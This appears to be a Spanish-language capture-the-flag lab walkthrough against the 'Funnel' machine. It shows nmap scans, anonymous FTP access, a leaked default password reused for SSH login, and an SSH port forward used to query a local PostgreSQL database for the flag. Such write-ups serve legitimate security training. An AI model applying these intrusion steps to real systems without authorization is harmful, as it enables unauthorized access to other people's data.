🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.228.195

PING 10.129.228.195 (10.129.228.195) 56(84) bytes of data.
64 bytes from 10.129.228.195: icmp_seq=1 ttl=63 time=166 ms

--- 10.129.228.195 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 166.276/166.276/166.276/0.000 ms
```

> Sistema operativo:  **Linux**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vv 10.129.228.195 -oG allPorts

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 21,22 -sCV 10.129.228.195 -oN targeted

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.112
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Servicio | Versión                                                      |
| ------ | -------- | ------------------------------------------------------------ |
| 21     | ftp      | vsftpd 3.0.3                                                 |
| 22     | ssh      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) |

🗹 Acceder al servidor mediante el servicio `ftp` de manera anónima:

```shell
ftp ftp://anonymous:@10.129.228.195

Connected to 10.129.228.195.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> dir
229 Entering Extended Passive Mode (|||59206|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
226 Directory send OK.
ftp> cd mail_backup
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||26213|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.
ftp> get password_policy.pdf
local: password_policy.pdf remote: password_policy.pdf
229 Entering Extended Passive Mode (|||30796|)
150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
100% |*******************************************************************************************************************************************| 58899      163.82 KiB/s    00:00 ETA
226 Transfer complete.
58899 bytes received in 00:00 (110.05 KiB/s)
ftp> get welcome_28112022
local: welcome_28112022 remote: welcome_28112022
229 Entering Extended Passive Mode (|||32181|)
150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
100% |*******************************************************************************************************************************************|   713        5.27 MiB/s    00:00 ETA
226 Transfer complete.
713 bytes received in 00:00 (4.09 KiB/s)
ftp> exit
221 Goodbye.
```

🗹 Abrir el archivo descargado `welcome_28112022` y tomar nota de los usuario encontrados:

```shell
cat welcome_28112022


```

🗹 Abrir el archivo descargado `password_policy.pdf` y tomar nota de la contraseña encontrada:

```shell
xdg-open password_policy.pdf

Password Policy 🔐
Overview
Passwords are a key part of our cyber security strategy. The purpose of this policy
is to make sure all resources and data receive adequate password protection. We
cannot overstate the importance of following a secure password policy and
therefore have provided this document for your guidance. The policy covers all
users who are responsible for one or more account or have access to any resource
that requires a password.
Password Creation:
• All passwords should be su ciently complex and therefore di cult for anyone to
guess.
• In addition, employees should also use common sense when choosing
passwords. They must avoid basic combinations that are easy to crack. For
instance, choices like “password,” “password1” and “Pa$$w0rd” are equally bad
from a security perspective.
• A password should be unique, with meaning only to the user who chooses it.
• In some cases, it will be necessary to change passwords at certain frequencies.
• Default passwords — such as those created for new users — must be changed
as quickly as possible. For example the default password of “funnel123#!#” must
be changed immediately.
```

🗹 Probar acceder al servidor por `ssh` probando cada nombre de usuario con la contraseña por defecto encontrada en las políticas de contraseña:

```shell
ssh christine@10.129.228.195
```

🗹 Verificar qué puertos están abiertos y en uso en el servidor:

```shell
christine@funnel:~$ netstat -nat

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:37875         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN     
tcp        0    208 10.129.228.195:22       10.10.14.112:34762      ESTABLISHED
tcp        0      1 10.129.228.195:46548    8.8.8.8:53              SYN_SENT   
tcp6       0      0 :::21                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     

christine@funnel:~$ netstat -at
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:37875         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 localhost:postgresql    0.0.0.0:*               LISTEN     
tcp        0    208 10.129.228.195:ssh      10.10.14.112:34762      ESTABLISHED
tcp        0      1 10.129.228.195:41068    8.8.8.8:domain          SYN_SENT   
tcp6       0      0 [::]:ftp                [::]:*                  LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN   
```

🗹 Acceder al servicio **postgresql** que se ejecuta en el localhost en el puerto 5432 del servidor a través de un port forwarding con **SSH**:

```shell
ssh -f -N -L 1234:localhost:5432 christine@10.129.228.195
christine@10.129.228.195's password:

psql -h localhost -U christine -p 1234
Password for user christine:
```
## Flag

La flag se encuentra en la base de datos `secrets` y, la tabla `flag`:

```shell
christine=# \l

                                                        List of databases
   Name    |   Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | ICU Locale | ICU Rules |    Access privileges    
-----------+-----------+----------+-----------------+------------+------------+------------+-----------+-------------------------
 christine | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
 postgres  | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
 secrets   | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
 template0 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/christine           +
           |           |          |                 |            |            |            |           | christine=CTc/christine
 template1 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/christine           +
           |           |          |                 |            |            |            |           | christine=CTc/christine
(5 rows)

christine=# \c secrets
psql (16.2 (Debian 16.2-1), server 15.1 (Debian 15.1-1.pgdg110+1))
You are now connected to database "secrets" as user "christine".

secrets=# \dt
         List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
(1 row)

secrets=# SELECT * FROM flag;
              value               
----------------------------------
 <flag>
(1 row)
```